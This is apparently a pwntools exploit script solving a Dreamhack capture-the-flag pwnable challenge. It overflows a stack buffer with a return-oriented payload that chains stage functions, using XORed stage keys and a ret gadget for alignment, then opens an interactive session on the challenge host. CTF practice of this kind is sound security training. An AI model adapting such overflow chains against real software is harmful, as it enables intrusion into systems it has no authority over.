from pwn import *

port = 17043
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/stack aligne test/problem/chall")

gadgets_addr = elf.symbols['gadgets']
vulnerable_addr = elf.symbols['vulnerable']
stage1_addr = elf.symbols['execute_stage1']
stage2_addr = elf.symbols['execute_stage2']
getflag_addr = elf.symbols['get_flag']
ret_addr = 0x4012a2

def get_stagekey() :  
  rem.recvuntil(b"Current stage key: ")
  return int(rem.recvline().rstrip().decode()[2:], 16)

def send_payload(addr, num) :
  stage_key = get_stagekey()
  rem.recvuntil(b"Input: ")
  payload = b"A" * 24
  payload += p64(ret_addr)
  payload += p64(gadgets_addr)
  payload += p64(stage_key ^ num)
  payload += p64(addr)
  payload += p64(ret_addr)
  payload += p64(vulnerable_addr)
  rem.sendline(payload)

# stage 1
send_payload(stage1_addr, 0xCAFEBABE)
# stage 2
send_payload(stage2_addr, 0xF00DBABE)
# # get flag
send_payload(getflag_addr, 0x12345678)

rem.interactive()